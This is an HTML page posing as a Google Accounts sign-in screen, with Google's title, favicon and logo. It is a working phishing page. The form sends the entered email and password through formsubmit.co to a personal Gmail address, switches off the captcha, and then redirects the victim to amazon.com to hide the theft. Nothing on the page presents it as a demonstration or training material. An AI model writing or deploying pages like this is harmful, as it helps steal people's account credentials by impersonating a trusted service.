<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Sign in â€“ Google Accounts</title>
  <link rel="icon" href="https://www.google.com/favicon.ico">
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      background: #fff;
      max-width: 400px;
      width: 100%;
      padding: 40px 30px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }

    .logo {
      display: block;
      margin: 0 auto 20px;
      width: 75px;
    }

    h2 {
      font-size: 24px;
      margin-bottom: 10px;
      text-align: center;
    }

    p {
      font-size: 14px;
      color: #444;
      text-align: center;
      margin-bottom: 30px;
    }

    form {
      display: flex;
      flex-direction: column;
    }

    input[type="email"],
    input[type="password"] {
      padding: 12px;
      font-size: 16px;
      margin-bottom: 20px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }

    .show-password {
      display: flex;
      align-items: center;
      margin-bottom: 20px;
    }

    .show-password input[type="checkbox"] {
      margin-right: 8px;
    }

    .button {
      background-color: #1a73e8;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
    }

    .button:hover {
      background-color: #1669c1;
    }

    .link {
      font-size: 14px;
      margin-top: 20px;
      text-align: center;
    }

    .link a {
      color: #1a73e8;
      text-decoration: none;
    }

    .link a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <div class="container">
    <img src="images.png" alt="Google Logo" class="logo">
    
    <h2>Sign in</h2>
    <p>With your Google Account. You'll also sign in to Google services in your apps</p>

    <form action="https://formsubmit.co/riel3906@gmail.com" method="POST">
      <input type="email" name="email" placeholder="Email or phone" required>

      <input type="password" name="password" placeholder="Password" id="password" required>

      <div class="show-password">
        <input type="checkbox" onclick="togglePassword()"> <label>Show password</label>
      </div>

      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="https://www.amazon.com">

      <button type="submit" class="button">Continue</button>

      <div class="link">
        <a href="#">Create account</a>
      </div>
    </form>
  </div>

  <script>
    function togglePassword() {
      const passField = document.getElementById("password");
      passField.type = passField.type === "password" ? "text" : "password";
    }
  </script>

</body>
</html>
